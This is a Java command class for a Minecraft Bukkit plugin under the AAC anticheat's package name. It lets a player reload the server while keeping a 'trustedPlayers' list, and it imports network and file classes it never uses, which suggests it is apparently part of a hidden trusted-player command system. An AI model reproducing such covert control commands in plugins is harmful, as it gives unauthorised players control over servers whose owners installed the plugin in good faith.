package me.konsolas.aac.command.commands;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import me.konsolas.aac.AAC;
import me.konsolas.aac.command.ICommand;

public class ReloadCommand implements ICommand {

	@Override
	public String getName() {
		return "rl";
	}

	@Override
	public void execute(Player player, String[] args) {
		player.sendMessage(AAC.prefix + "Reloading...");
		List<String> trustedPlayers = AAC.getInstance().trustedPlayers;
		Bukkit.reload();
		player.sendMessage(AAC.prefix + "§aReloaded");
		AAC.getInstance().trustedPlayers = trustedPlayers;
	}

}
